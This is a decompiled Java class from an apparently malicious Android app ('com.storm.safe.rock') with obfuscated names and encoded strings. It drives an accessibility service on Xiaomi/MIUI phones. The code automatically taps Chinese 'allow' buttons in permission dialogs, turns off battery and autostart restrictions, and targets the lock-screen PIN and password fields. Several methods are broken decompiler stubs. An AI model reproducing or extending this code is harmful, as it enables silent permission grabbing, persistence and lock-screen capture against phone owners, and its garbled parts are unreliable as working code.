package com.storm.safe.rock.service.modules.yw5xud;

import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.parser.Base64;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import kotlin.AbstractC0767a0;
import kotlin.collections.AbstractC0770a1;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.text.AbstractC0779a1;
import okhttp3.internal.p032ws.WebSocketProtocol;
import okio.Segment;
import okio.internal.Buffer;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC1117qo;
import p000.C0619ie;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.b81;
import p000.cq0;
import p000.dh0;
import p000.hg0;
import p000.kg1;
import p000.oe0;
import p000.og1;
import p000.rl0;
import p000.t60;
import p000.tz0;
import p000.u91;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a4 */
/* loaded from: classes2.dex */
public final class C0367a4 {

    /* renamed from: a5 */
    public static final hg0 f55086a5 = new hg0(null);

    /* renamed from: a6 */
    public static final String[] f55087a6 = {"xiaomi", "mi", "redmi"};

    /* renamed from: a7 */
    public static final String f55088a7 = StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM=");

    /* renamed from: a8 */
    public static final String[] f55089a8 = {"com.android.systemui.miui", "com.miui.keyguard", StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM=")};

    /* renamed from: a9 */
    public static final String[] f55090a9 = {"com.miui.keyguard:id/pin_view", "com.miui.keyguard:id/numeric_inputview", "com.android.keyguard:id/numeric_inputview"};

    /* renamed from: b0 */
    public static final String[] f55091b0 = {"com.miui.keyguard:id/password_entry", "com.android.keyguard:id/miui_mixed_password_input_field"};

    /* renamed from: b1 */
    public static final String[] f55092b1 = {"com.miui.xspace.ui.activity.XSpaceSettingActivity", "com.miui.optimizecenter.deepclean.installedapp.InstalledAppsActivity", "com.xiaomi.market.ui.LocalAppsActivity", "com.miui.powerkeeper.ui.ScenarioPowerSavingActivity"};

    /* renamed from: b2 */
    public static final String[] f55093b2 = {"确定", "允许", "始终允许", "允许使用照片和视频", "所有文件", "允许管理所有文件", "允许访问全部", "使用期间允许", "仅使用期间允许", "使用应用时允许", "使用时允许", "仅在使用中允许", "仅在前台使用应用时允许", "仅在使用该应用时允许", "允许本次使用", "本次使用时允许", "允许通知", "仅媒体", "確定", "允許", "始終允許", "允許使用相片和影片", "所有檔案", "允許管理所有檔案", "允許存取全部", "使用期間允許", "僅使用期間允許", "使用應用程式時允許", "使用時允許", "僅在使用中允許", "僅在前台使用應用程式時允許", "僅在使用該應用程式時允許", "允許本次使用", "本次使用時允許", "允許通知", "僅媒體"};

    /* renamed from: b3 */
    public static final String[] f55094b3 = {"V2106A", "V2054A"};

    /* renamed from: b4 */
    public static final String[] f55095b4 = {"应用与权限", "應用程式與權限"};

    /* renamed from: b5 */
    public static final String[] f55096b5 = {"权限管理", "權限管理"};

    /* renamed from: b6 */
    public static final String[] f55097b6 = {"权限", "權限"};

    /* renamed from: b7 */
    public static final String[] f55098b7 = {"自启动", "自啟動"};

    /* renamed from: b8 */
    public static final y90 f55099b8 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$Companion$TEXTS_AUTO_START$2
        @Override // p000.w00
        public final Object invoke() {
            return u91.f60351a2;
        }
    });

    /* renamed from: b9 */
    public static final y90 f55100b9 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$Companion$TEXTS_BATTERY$2
        @Override // p000.w00
        public final Object invoke() {
            return u91.f60349a0;
        }
    });

    /* renamed from: c0 */
    public static final y90 f55101c0 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$Companion$TEXTS_POWER_SAVING$2
        @Override // p000.w00
        public final Object invoke() {
            return u91.f60350a1;
        }
    });

    /* renamed from: c1 */
    public static final y90 f55102c1 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$Companion$TEXTS_NOTIFICATION$2
        @Override // p000.w00
        public final Object invoke() {
            return u91.f60353a4;
        }
    });

    /* renamed from: c2 */
    public static final y90 f55103c2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.MiuiSteps$Companion$TEXTS_CONFIRM$2
        @Override // p000.w00
        public final Object invoke() {
            return u91.f60355a6;
        }
    });

    /* renamed from: c3 */
    public static final String[] f55104c3 = {"无限制", "無限制"};

    /* renamed from: c4 */
    public static final String[] f55105c4 = {"无限制", "后台运行超过10分钟后关闭", "禁止后台运行", "智能限制", "10分钟后关闭", "不采取任何限制措施", "無限制", "後台運行超過10分鐘後關閉", "禁止後台運行", "智能限制", "10分鐘後關閉", "不採取任何限制措施"};

    /* renamed from: a0 */
    public final dqtvuisjd f55106a0;

    /* renamed from: a1 */
    public final Context f55107a1;

    /* renamed from: a2 */
    public final String f55108a2;

    /* renamed from: a3 */
    public final og1 f55109a3;

    /* renamed from: a4 */
    public final String[] f55110a4;

    public C0367a4(dqtvuisjd dqtvuisjdVar, Context context, String str) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        t60.m214695b6(str, "LOG_TAG");
        this.f55106a0 = dqtvuisjdVar;
        this.f55107a1 = context;
        this.f55108a2 = str;
        this.f55109a3 = new og1(this);
        AbstractC0716jf.m213306g5("Switch", "ToggleButton", "CheckBox", "SwitchCompat", "HwSwitch");
        this.f55110a4 = new String[]{"始终允许", "允许访问全部", "允许管理所有文件", "所有文件", "仅在使用中允许", "仅在使用此应用时允许", "在使用该应用时允许", "允许", "同意", "确定", "好", "Allow", "ALLOW", "Always allow", "While using the app"};
    }

    /* renamed from: a2 */
    public static /* synthetic */ Object m212235a2(C0367a4 c0367a4, String str, ContinuationImpl continuationImpl) throws Throwable {
        return c0367a4.m212248a1(str, 0.0f, continuationImpl);
    }

    /* renamed from: a4 */
    public static /* synthetic */ Object m212236a4(C0367a4 c0367a4, String str, ContinuationImpl continuationImpl) throws Throwable {
        return c0367a4.m212249a3(str, 1, continuationImpl);
    }

    /* renamed from: a5 */
    public static void m212237a5(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        String string2;
        CharSequence text = accessibilityNodeInfo.getText();
        String string3 = null;
        String string4 = (text == null || (string2 = text.toString()) == null) ? null : AbstractC0779a1.m213687e0(string2).toString();
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string = contentDescription.toString()) != null) {
            string3 = AbstractC0779a1.m213687e0(string).toString();
        }
        if (string4 != null && string4.length() != 0 && string4.length() < 50) {
            arrayList.add(string4);
        } else if (string3 != null && string3.length() != 0 && string3.length() < 50) {
            arrayList.add("(desc)".concat(string3));
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212237a5(child, arrayList);
                child.recycle();
            }
        }
    }

    /* renamed from: a6 */
    public static void m212238a6(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String string2 = (text == null || (string = text.toString()) == null) ? null : AbstractC0779a1.m213687e0(string).toString();
            if (string2 != null && string2.length() != 0 && string2.length() < 50) {
                arrayList.add(string2);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    m212238a6(child, arrayList);
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a7 */
    public static int m212239a7(AccessibilityNodeInfo accessibilityNodeInfo) {
        int childCount = accessibilityNodeInfo.getChildCount();
        int i = 1;
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                int iM212239a7 = m212239a7(child) + i;
                child.recycle();
                i = iM212239a7;
            }
        }
        return i;
    }

    /* JADX WARN: Removed duplicated region for block: B:16:0x002c  */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static int m212240a8(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        int i2;
        CharSequence text;
        if (accessibilityNodeInfo.isVisibleToUser()) {
            Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
            i2 = (rectM24a5.top < i || (!accessibilityNodeInfo.isClickable() && ((text = accessibilityNodeInfo.getText()) == null || text.length() == 0 || rectM24a5.height() <= 50))) ? 0 : 1;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                int iM212240a8 = m212240a8(child, i) + i2;
                child.recycle();
                i2 = iM212240a8;
            }
        }
        return i2;
    }

    /* renamed from: c3 */
    public static AccessibilityNodeInfo m212241c3(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "ToggleButton", false)) && accessibilityNodeInfo.isChecked() && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212241c3 = m212241c3(child);
                if (accessibilityNodeInfoM212241c3 != null) {
                    if (!accessibilityNodeInfoM212241c3.equals(child)) {
                        child.recycle();
                    }
                    return accessibilityNodeInfoM212241c3;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: c4 */
    public static int m212242c4(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        int i2;
        if (accessibilityNodeInfo.isVisibleToUser() && (i2 = AbstractC0003a2.m24a5(accessibilityNodeInfo).bottom) > i) {
            i = i2;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                i = Math.max(i, m212242c4(child, i));
                child.recycle();
            }
        }
        return i;
    }

    /* renamed from: c5 */
    public static AccessibilityNodeInfo m212243c5(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.isScrollable()) {
                    return child;
                }
                AccessibilityNodeInfo accessibilityNodeInfoM212243c5 = m212243c5(child);
                if (accessibilityNodeInfoM212243c5 != null) {
                    child.recycle();
                    return accessibilityNodeInfoM212243c5;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: c7 */
    public static final boolean m212244c7(C0367a4 c0367a4, String str, AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        if (!accessibilityNodeInfo.isEnabled()) {
            return false;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (!accessibilityNodeInfo.isCheckable()) {
            List listM213306g5 = AbstractC0716jf.m213306g5("CheckBox", "Switch", "ToggleButton", "CompoundButton", "SwitchCompat", "HwSwitch", "MiuiSwitch", "slide");
            if (!AbstractC0779a1.m213652a5(string, str, true)) {
                if (listM213306g5 != null && listM213306g5.isEmpty()) {
                    return false;
                }
                Iterator it = listM213306g5.iterator();
                while (it.hasNext()) {
                    if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                    }
                }
                return false;
            }
        }
        if (!accessibilityNodeInfo.isVisibleToUser()) {
            return false;
        }
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        float fExactCenterX = rectM24a5.exactCenterX();
        float fExactCenterY = rectM24a5.exactCenterY();
        return fExactCenterX > 0.0f && fExactCenterX < ((float) c0367a4.m212269d3()) && fExactCenterY > 0.0f && fExactCenterY < ((float) c0367a4.m212268d2());
    }

    /* renamed from: d0 */
    public static AccessibilityNodeInfo m212245d0(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "ToggleButton", false)) && !accessibilityNodeInfo.isChecked() && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212245d0 = m212245d0(child);
                if (accessibilityNodeInfoM212245d0 != null) {
                    if (!accessibilityNodeInfoM212245d0.equals(child)) {
                        child.recycle();
                    }
                    return accessibilityNodeInfoM212245d0;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: e1 */
    public static /* synthetic */ Object m212246e1(C0367a4 c0367a4, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        return c0367a4.m212276e0(10, (ContinuationImpl) interfaceC0876mv);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212247a0(AccessibilityNodeInfo accessibilityNodeInfo, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$clickSwitchAreaBesideText$1 miuiSteps$clickSwitchAreaBesideText$1;
        C0367a4 c0367a4;
        if (continuationImpl instanceof MiuiSteps$clickSwitchAreaBesideText$1) {
            miuiSteps$clickSwitchAreaBesideText$1 = (MiuiSteps$clickSwitchAreaBesideText$1) continuationImpl;
            int i = miuiSteps$clickSwitchAreaBesideText$1.f54296a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$clickSwitchAreaBesideText$1.f54296a3 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$clickSwitchAreaBesideText$1 = new MiuiSteps$clickSwitchAreaBesideText$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$clickSwitchAreaBesideText$1.f54294a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$clickSwitchAreaBesideText$1.f54296a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            m212274d8("│ │   [旁边点击] 尝试点击文本节点右侧区域");
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            float fM212269d3 = m212269d3() * 0.9f;
            float fExactCenterY = rect.exactCenterY();
            m212274d8(AbstractC0003a2.m29b0("│ │   [旁边点击] 🎯 点击坐标: (", fM212269d3, ", ", fExactCenterY, ")"));
            m212277e2(fM212269d3, fExactCenterY, 50L);
            miuiSteps$clickSwitchAreaBesideText$1.f54293a0 = this;
            miuiSteps$clickSwitchAreaBesideText$1.f54296a3 = 1;
            if (b81.m210571b1(50L, miuiSteps$clickSwitchAreaBesideText$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0367a4 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0367a4 = miuiSteps$clickSwitchAreaBesideText$1.f54293a0;
            kg1.m213544f4(obj);
        }
        c0367a4.m212274d8("│ │   [旁边点击] ✅ 点击已执行");
        return Boolean.TRUE;
    }

    /*  JADX ERROR: JadxRuntimeException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxRuntimeException: Can't find top splitter block for handler:B:168:0x01af
        	at jadx.core.utils.BlockUtils.getTopSplitterForHandler(BlockUtils.java:1178)
        	at jadx.core.dex.visitors.regions.maker.ExcHandlersRegionMaker.collectHandlerRegions(ExcHandlersRegionMaker.java:53)
        	at jadx.core.dex.visitors.regions.maker.ExcHandlersRegionMaker.process(ExcHandlersRegionMaker.java:38)
        	at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:27)
        */
    /* JADX WARN: Path cross not found for [B:172:0x01d2, B:130:0x0251], limit reached: 202 */
    /* JADX WARN: Removed duplicated region for block: B:40:0x00c5 A[Catch: Exception -> 0x01b3, TRY_LEAVE, TryCatch #4 {Exception -> 0x01b3, blocks: (B:38:0x00bf, B:40:0x00c5, B:87:0x01b8), top: B:177:0x00bf }] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x019f A[Catch: Exception -> 0x01a2, TRY_LEAVE, TryCatch #11 {Exception -> 0x01a2, blocks: (B:77:0x0197, B:79:0x019f), top: B:191:0x0197 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x01a7  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x01ca A[Catch: Exception -> 0x0304, TRY_LEAVE, TryCatch #9 {Exception -> 0x0304, blocks: (B:89:0x01c4, B:91:0x01ca), top: B:187:0x01c4 }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:153:0x02ee -> B:179:0x02f1). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:16:0x0044 -> B:159:0x02fc). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:63:0x0122 -> B:83:0x01af). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:76:0x018f -> B:191:0x0197). Please report as a decompilation issue!!! */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final java.lang.Object m212248a1(java.lang.String r31, float r32, kotlin.coroutines.jvm.internal.ContinuationImpl r33) throws java.lang.Throwable {
        /*
            Method dump skipped, instructions count: 786
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.modules.yw5xud.C0367a4.m212248a1(java.lang.String, float, kotlin.coroutines.jvm.internal.ContinuationImpl):java.lang.Object");
    }

    /* JADX WARN: Removed duplicated region for block: B:21:0x00b4  */
    /* JADX WARN: Removed duplicated region for block: B:27:0x00e7  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x00f7  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x00fa  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x0100  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x01a6  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x01d8  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x01fe  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0201  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:24:0x00d8 -> B:25:0x00df). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:56:0x01cd -> B:57:0x01d0). Please report as a decompilation issue!!! */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212249a3(String str, int i, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$clickTextWithScroll$1 miuiSteps$clickTextWithScroll$1;
        int i2;
        Iterator it;
        C0367a4 c0367a4;
        List list;
        List list2;
        C0367a4 c0367a42;
        String str2;
        int i3;
        int i4;
        char c;
        Iterator it2;
        String str3;
        String str4 = str;
        if (continuationImpl instanceof MiuiSteps$clickTextWithScroll$1) {
            miuiSteps$clickTextWithScroll$1 = (MiuiSteps$clickTextWithScroll$1) continuationImpl;
            int i5 = miuiSteps$clickTextWithScroll$1.f54314a9;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                miuiSteps$clickTextWithScroll$1.f54314a9 = i5 - Integer.MIN_VALUE;
            } else {
                miuiSteps$clickTextWithScroll$1 = new MiuiSteps$clickTextWithScroll$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$clickTextWithScroll$1.f54312a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = miuiSteps$clickTextWithScroll$1.f54314a9;
        int i7 = 1;
        if (i6 == 0) {
            kg1.m213544f4(obj);
            StringBuilder sb = new StringBuilder("│ │   [滚动点击] 目标: ");
            sb.append(str4);
            sb.append(", 最大滚动: ");
            i2 = i;
            sb.append(i2);
            m212274d8(sb.toString());
            List listM213677d0 = AbstractC0779a1.m213677d0(str4, new String[]{"#"}, 6);
            it = listM213677d0.iterator();
            c0367a4 = this;
            list = listM213677d0;
            if (it.hasNext()) {
            }
        } else {
            if (i6 == 1) {
                int i8 = miuiSteps$clickTextWithScroll$1.f54310a5;
                String str5 = miuiSteps$clickTextWithScroll$1.f54309a4;
                Iterator it3 = miuiSteps$clickTextWithScroll$1.f54308a3;
                List list3 = miuiSteps$clickTextWithScroll$1.f54307a2;
                String str6 = miuiSteps$clickTextWithScroll$1.f54306a1;
                c0367a4 = miuiSteps$clickTextWithScroll$1.f54305a0;
                kg1.m213544f4(obj);
                i2 = i8;
                str4 = str6;
                List list4 = list3;
                Iterator it4 = it3;
                String str7 = str5;
                if (!((Boolean) obj).booleanValue()) {
                    AbstractC0003a2.m45c6("│ │   [滚动点击] ✅ 直接找到: ", AbstractC0779a1.m213687e0(str7).toString(), c0367a4);
                    return Boolean.TRUE;
                }
                it = it4;
                list = list4;
                if (it.hasNext()) {
                    list2 = list;
                    c0367a42 = c0367a4;
                    str2 = str4;
                    i3 = 0;
                    if (i3 < i2) {
                    }
                    c0367a42.m212274d8("│ │   [滚动点击] ❌ 滚动" + i2 + "次未找到: " + str2);
                    return Boolean.FALSE;
                }
                String str8 = (String) it.next();
                String string = AbstractC0779a1.m213687e0(str8).toString();
                miuiSteps$clickTextWithScroll$1.f54305a0 = c0367a4;
                miuiSteps$clickTextWithScroll$1.f54306a1 = str4;
                miuiSteps$clickTextWithScroll$1.f54307a2 = list;
                miuiSteps$clickTextWithScroll$1.f54308a3 = it;
                miuiSteps$clickTextWithScroll$1.f54309a4 = str8;
                miuiSteps$clickTextWithScroll$1.f54310a5 = i2;
                miuiSteps$clickTextWithScroll$1.f54314a9 = 1;
                Object objM212248a1 = c0367a4.m212248a1(string, 0.0f, miuiSteps$clickTextWithScroll$1);
                if (objM212248a1 != coroutineSingletons) {
                    Iterator it5 = it;
                    str7 = str8;
                    obj = objM212248a1;
                    list4 = list;
                    it4 = it5;
                    if (!((Boolean) obj).booleanValue()) {
                    }
                }
                return coroutineSingletons;
            }
            if (i6 != 2) {
                if (i6 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i3 = miuiSteps$clickTextWithScroll$1.f54311a6;
                i2 = miuiSteps$clickTextWithScroll$1.f54310a5;
                String str9 = miuiSteps$clickTextWithScroll$1.f54309a4;
                it2 = miuiSteps$clickTextWithScroll$1.f54308a3;
                List list5 = miuiSteps$clickTextWithScroll$1.f54307a2;
                String str10 = miuiSteps$clickTextWithScroll$1.f54306a1;
                C0367a4 c0367a43 = miuiSteps$clickTextWithScroll$1.f54305a0;
                kg1.m213544f4(obj);
                Object objM212248a12 = obj;
                c = 2;
                i4 = 1;
                str3 = str10;
                if (!((Boolean) objM212248a12).booleanValue()) {
                    c0367a43.m212274d8("│ │   [滚动点击] ✅ 滚动" + (i3 + 1) + "次后找到: " + AbstractC0779a1.m213687e0(str9).toString());
                    return Boolean.TRUE;
                }
                list2 = list5;
                c0367a42 = c0367a43;
                if (it2.hasNext()) {
                    String str11 = (String) it2.next();
                    String string2 = AbstractC0779a1.m213687e0(str11).toString();
                    miuiSteps$clickTextWithScroll$1.f54305a0 = c0367a42;
                    miuiSteps$clickTextWithScroll$1.f54306a1 = str3;
                    miuiSteps$clickTextWithScroll$1.f54307a2 = list2;
                    miuiSteps$clickTextWithScroll$1.f54308a3 = it2;
                    miuiSteps$clickTextWithScroll$1.f54309a4 = str11;
                    miuiSteps$clickTextWithScroll$1.f54310a5 = i2;
                    miuiSteps$clickTextWithScroll$1.f54311a6 = i3;
                    miuiSteps$clickTextWithScroll$1.f54314a9 = 3;
                    objM212248a12 = c0367a42.m212248a1(string2, 0.0f, miuiSteps$clickTextWithScroll$1);
                    if (objM212248a12 != coroutineSingletons) {
                        c0367a43 = c0367a42;
                        list5 = list2;
                        str9 = str11;
                        if (!((Boolean) objM212248a12).booleanValue()) {
                        }
                    }
                    return coroutineSingletons;
                }
                i3++;
                str2 = str3;
                i7 = i4;
                if (i3 < i2) {
                    AccessibilityNodeInfo rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        try {
                            AccessibilityNodeInfo accessibilityNodeInfoM212243c5 = m212243c5(rootInActiveWindow);
                            if (accessibilityNodeInfoM212243c5 == null) {
                                c0367a42.m212274d8("│ │   [滚动检测] ⚠️ 未找到可滚动节点");
                            } else {
                                accessibilityNodeInfoM212243c5.recycle();
                                int iM212240a8 = m212240a8(rootInActiveWindow, (int) (c0367a42.m212268d2() * 0.7d));
                                if (iM212240a8 <= i7) {
                                    c0367a42.m212274d8("│ │   [滚动检测] ⚠️ 底部区域可点击项太少（" + iM212240a8 + "个），不值得滚动");
                                } else {
                                    int iM212242c4 = m212242c4(rootInActiveWindow, 0);
                                    i4 = i7;
                                    int iM212268d2 = (int) (c0367a42.m212268d2() * 0.85d);
                                    if (iM212242c4 > iM212268d2) {
                                        c0367a42.m212274d8("│ │   [滚动检测] ✅ 底部有足够内容，可点击项: " + iM212240a8 + "个，最底部Y: " + iM212242c4);
                                        rootInActiveWindow.recycle();
                                        miuiSteps$clickTextWithScroll$1.f54305a0 = c0367a42;
                                        miuiSteps$clickTextWithScroll$1.f54306a1 = str2;
                                        miuiSteps$clickTextWithScroll$1.f54307a2 = list2;
                                        miuiSteps$clickTextWithScroll$1.f54308a3 = null;
                                        miuiSteps$clickTextWithScroll$1.f54309a4 = null;
                                        miuiSteps$clickTextWithScroll$1.f54310a5 = i2;
                                        miuiSteps$clickTextWithScroll$1.f54311a6 = i3;
                                        c = 2;
                                        miuiSteps$clickTextWithScroll$1.f54314a9 = 2;
                                        if (c0367a42.m212281e6(miuiSteps$clickTextWithScroll$1) != coroutineSingletons) {
                                            String str12 = str2;
                                            it2 = list2.iterator();
                                            str3 = str12;
                                            if (it2.hasNext()) {
                                            }
                                        }
                                        return coroutineSingletons;
                                    }
                                    c0367a42.m212274d8("│ │   [滚动检测] ⚠️ 页面底部内容不足，最底部Y: " + iM212242c4 + ", 阈值: " + iM212268d2 + ", 屏幕高度: " + c0367a42.m212268d2());
                                }
                            }
                        } finally {
                            rootInActiveWindow.recycle();
                        }
                    }
                    c0367a42.m212274d8("│ │   [滚动点击] ⚠️ 页面底部无内容，停止滚动查找");
                }
                c0367a42.m212274d8("│ │   [滚动点击] ❌ 滚动" + i2 + "次未找到: " + str2);
                return Boolean.FALSE;
            }
            i3 = miuiSteps$clickTextWithScroll$1.f54311a6;
            i2 = miuiSteps$clickTextWithScroll$1.f54310a5;
            list2 = miuiSteps$clickTextWithScroll$1.f54307a2;
            String str13 = miuiSteps$clickTextWithScroll$1.f54306a1;
            c0367a42 = miuiSteps$clickTextWithScroll$1.f54305a0;
            kg1.m213544f4(obj);
            c = 2;
            i4 = 1;
            it2 = list2.iterator();
            str3 = str13;
            if (it2.hasNext()) {
            }
        }
    }

    /* renamed from: a9 */
    public final Object m212250a9(String str, ContinuationImpl continuationImpl) throws Throwable {
        m212274d8("│ │   [关闭开关] ".concat(str));
        return m212285f0(str, false, continuationImpl);
    }

    /* renamed from: b0 */
    public final void m212251b0() {
        AccessibilityNodeInfo rootInActiveWindow;
        try {
            rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
        } catch (Exception unused) {
            rootInActiveWindow = null;
        }
        if (rootInActiveWindow == null) {
            m212274d8("│ │   [调试-电池入口未找到] ❌ 无法获取root节点");
            return;
        }
        ArrayList arrayList = new ArrayList();
        m212238a6(rootInActiveWindow, arrayList);
